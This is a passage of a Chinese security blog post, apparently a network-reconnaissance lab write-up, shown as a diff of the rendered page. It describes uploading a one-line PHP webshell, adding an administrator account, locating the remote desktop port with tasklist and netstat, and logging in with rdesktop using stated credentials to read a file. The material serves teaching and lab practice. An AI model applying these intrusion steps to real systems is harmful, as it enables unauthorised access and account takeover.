+        print(&quot;fail to find webshell url&quot;)
+</code></pre>
+<p>我们将脚本文件和一句话木马文件准备好：<br><img src="/SeverusBlog/image/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F%E5%AE%9E%E9%AA%8C/1712823934902.png" alt="1712823934902"></p>
+<p>执行脚本文件：</p>
+<p><img src="/SeverusBlog/image/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F%E5%AE%9E%E9%AA%8C/1712825897228.png" alt="1712825897228"></p>
+<p>测试命令phpinfo()</p>
+<p><img src="/SeverusBlog/image/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F%E5%AE%9E%E9%AA%8C/1712825970677.png" alt="1712825970677"></p>
+<p>出现该页面说明我们的一句话木马上传成功了。</p>
+<p>添加用户：<img src="/SeverusBlog/image/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F%E5%AE%9E%E9%AA%8C/1712826367936.png" alt="1712826367936"></p>
+<p>添加管理员：</p>
+<p><img src="/SeverusBlog/image/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F%E5%AE%9E%E9%AA%8C/1712826451478.png" alt="1712826451478"></p>
+<p>输入命令 <code>tasklist -svc</code></p>
+<p><img src="/SeverusBlog/image/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F%E5%AE%9E%E9%AA%8C/1712826849062.png" alt="1712826849062"></p>
+<p>找到COMSysApp svchost服务的PID为2416</p>
+<p>然后输入 <code>netstat -ano</code>来查找COMSys svchost服务对应的端口号，即远程桌面端口</p>
+<p><img src="/SeverusBlog/image/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F%E5%AE%9E%E9%AA%8C/1712826945541.png" alt="1712826945541"></p>
+<p>如图，远程桌面端口号为35155；</p>
+<h3 id="远程连接并查看文件内容"><a href="#远程连接并查看文件内容" class="headerlink" title="远程连接并查看文件内容"></a>远程连接并查看文件内容</h3><pre><code class="apache">rdesktop -u hacker -p Beijing123 192.168.1.4
+</code></pre>
+<p><img src="/SeverusBlog/image/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F%E5%AE%9E%E9%AA%8C/1712827538407.png" alt="1712827538407"></p>
+<p><img src="/SeverusBlog/image/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F%E5%AE%9E%E9%AA%8C/1712827477168.png" alt="1712827477168"></p>
+<p>修改文件属性</p>
+<p><img src="/SeverusBlog/image/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F%E5%AE%9E%E9%AA%8C/1712827600415.png" alt="1712827600415"></p>
+<p><img src="/SeverusBlog/image/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F%E5%AE%9E%E9%AA%8C/1712827647200.png" alt="1712827647200"></p>
+<p><img src="/SeverusBlog/image/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F%E5%AE%9E%E9%AA%8C/1712827706875.png" alt="1712827706875"></p>
+<p>文件内容是 <code> ftpstandrd123</code></p>
+
+    </div>
+     
+    <div class="post-footer__meta"><p>更新于 2024-09-10</p></div> 
+    <div class="post-entry__tags"><a href="/SeverusBlog/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" class="post-tags__link button"># 网络安全</a></div> 
+</article>
+
+
+    <div class="nav">
+        <div class="nav__prev">
+            
+        </div>
+        <div class="nav__next">
+            
+                <a href="/SeverusBlog/2024/09/10/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E5%AE%9E%E9%AA%8C/" class="nav__link">
+                    <div>
+                        <div class="nav__label">
+                            下一篇
+                        </div>
+                        <div class="nav__title">
+                            网络安全入侵检测实验
+                        </div>
+                    </div>
+                    <div>
+                        <svg viewBox="0 0 1024 1024" xmlns="http://www.w3.org/2000/svg" width="24" height="24"><path d="M434.944 790.624l-45.248-45.248L623.04 512l-233.376-233.376 45.248-45.248L713.568 512z" fill="#808080"></path></svg>
+                    </div>
+                </a>
+            
+        </div>
+    </div>
+
+
+
+    <div class="post__comments post__with-toc content-card" id="comment">
+        
+    <h4>评论</h4>
+    
+    
+    
+    <div id="valine_container" class="valine_thread"></div>
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+
+
+    </div>
+
+
+
+</main>
+
+            <footer class="footer">
+    
+    
+
+
+    
+     
+ 
+
+ 
+    
+        
+        <p class="footer-copyright">
+            Copyright © 2024 <a href="/SeverusBlog/">Severus&#39; Blog Site</a>
+        </p>
+    
+    
+    <p>Powered by <a href="https://hexo.io" target="_blank">Hexo</a> | Theme - <a href="https://github.com/ChrAlpha/hexo-theme-cards" target="_blank">Cards</a></p>
+</footer>
+
+        </div>
+         
+
+ 
+
+ 
+
+ 
+
+ 
+
+
+
+ 
+
+
+
+ 
+
+
+    
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+
+    
+
+    
+
+    
+    
+    <script>
+        function loadComment() {
+            let e;
+            (e = document.createElement("script")).src = 'https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js',
+            document.body.appendChild(e);
+            e.onload = () => {
+                var valineConfig = {"appId":"g22hZmqJ9HDVUEHYgPs16NJN-gzGzoHsz","appKey":"ulaHsmJDpXSbv2NxdT9YGgb2","placeholder":null,"path":null,"avatar":null,"meta":["nick","mail","link"],"pageSize":null,"lang":null,"visitor":null,"highlight":null,"avatarForce":null,"recordIP":null,"serverURLs":null,"enableQQ":true,"requiredFields":["nick","mail"],"emojiCDN":null,"emojiMaps":null};
+                valineConfig.el = '#valine_container';
+                for (var i in valineConfig) {
+                    if (valineConfig[i] === null) delete valineConfig[i];
+                }
+                new Valine(valineConfig);
+            };
+        }
+    
+        var runningOnBrowser = typeof window !== "undefined";
+        var isBot = runningOnBrowser && !("onscroll" in window) || typeof navigator !== "undefined" && /(gle|ing|ro|msn)bot|crawl|spider|yand|duckgo/i.test(navigator.userAgent);
+        var supportsIntersectionObserver = runningOnBrowser && "IntersectionObserver" in window;
+    
+        setTimeout(function () {
+            if (!isBot && supportsIntersectionObserver) {
+                var comment_observer = new IntersectionObserver(function(entries) {
+                    if (entries[0].isIntersecting) {
+                        loadComment();
+                        comment_observer.disconnect();
+                    }
+                }, { threshold: [0] });
+                comment_observer.observe(document.getElementById('comment'));
+            } else {
+                loadComment();
+            }
+        }, 1);
+    </script>
+
+
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+
+    
+    
+    
+
+
+
+    </body>
+</html>
